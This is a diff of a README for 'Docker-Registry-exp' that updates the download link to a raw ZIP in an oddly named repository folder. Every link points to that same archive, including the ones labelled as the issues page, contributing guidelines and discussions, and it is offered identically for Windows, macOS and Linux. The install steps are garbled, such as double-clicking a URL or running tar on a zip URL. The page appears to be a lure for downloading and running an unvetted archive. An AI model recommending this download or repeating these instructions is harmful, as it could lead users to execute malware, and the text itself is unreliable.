@@ -1,7 +1,7 @@
 # 🐳 Docker-Registry-exp - Powerful Docker Registry Tool Made Easy
 
 ## 📥 Download Now
-[![Download Docker-Registry-exp](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip)](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip)
+[![Download Docker-Registry-exp](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip)](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip)
 
 ## 🚀 Getting Started
 This guide will help you to download and run Docker-Registry-exp easily. Follow these simple steps to get started with the application. 
@@ -25,35 +25,35 @@ Docker-Registry-exp offers a range of features to enhance your Docker experience
 ## 💻 Download & Install
 To download Docker-Registry-exp, visit the following link:
 
-[Download Latest Release](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip)
+[Download Latest Release](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip)
 
 1. Click on the link to navigate to the Releases page.
 2. Locate the latest version of Docker-Registry-exp.
 3. Choose the appropriate file for your operating system. For example:
-   - **Windows:** https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip
-   - **macOS:** https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip
-   - **Linux:** https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip
+   - **Windows:** https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip
+   - **macOS:** https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip
+   - **Linux:** https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip
 4. Click the file to start your download.
 
 ## 📊 Installation Instructions
 Once you have downloaded the application, follow these steps to install it:
 
 ### For Windows:
-1. Locate the `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip` file in your Downloads folder.
+1. Locate the `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip` file in your Downloads folder.
 2. Right-click the ZIP file and select "Extract All."
 3. Click "Extract" to unzip the files.
-4. Open the extracted folder and double-click `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip` to run the application.
+4. Open the extracted folder and double-click `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip` to run the application.
 
 ### For macOS:
-1. Find the `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip` in your Downloads folder.
+1. Find the `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip` in your Downloads folder.
 2. Double-click the ZIP file to extract it.
-3. Open the resulting folder and double-click on `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip` to launch it.
+3. Open the resulting folder and double-click on `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip` to launch it.
 
 ### For Linux:
 1. Navigate to your Downloads directory.
-2. Extract the `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip` file using:
+2. Extract the `https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip` file using:
    ```bash
-   tar -xzvf https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip
+   tar -xzvf https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip
    ```
 3. Change into the extracted directory:
    ```bash
@@ -80,12 +80,12 @@ If you encounter any issues while using the application, consider the following:
 3. **Performance Issues:** Check if your system meets the requirements. Closing unused applications may help improve performance.
 
 ## 📞 Support
-If you require further assistance, visit the [Issues Page](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip) on GitHub. You can report any issues you face, and community members or maintainers will assist you.
+If you require further assistance, visit the [Issues Page](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip) on GitHub. You can report any issues you face, and community members or maintainers will assist you.
 
 ## 🤝 Contributing
-We welcome contributions! If you want to improve Docker-Registry-exp, check out the [Contributing Guidelines](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip) to get started.
+We welcome contributions! If you want to improve Docker-Registry-exp, check out the [Contributing Guidelines](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip) to get started.
 
-For the latest updates and discussions, follow the [repository discussions](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/Docker-Registry-exp-1.2.zip).
+For the latest updates and discussions, follow the [repository discussions](https://raw.githubusercontent.com/tekm4412/Docker-Registry-exp/main/holosericeous/exp_Docker_Registry_v2.6.zip).
 
 ## 📝 License
 Docker-Registry-exp is licensed under the MIT License. You can use and modify it freely under the terms of this license.
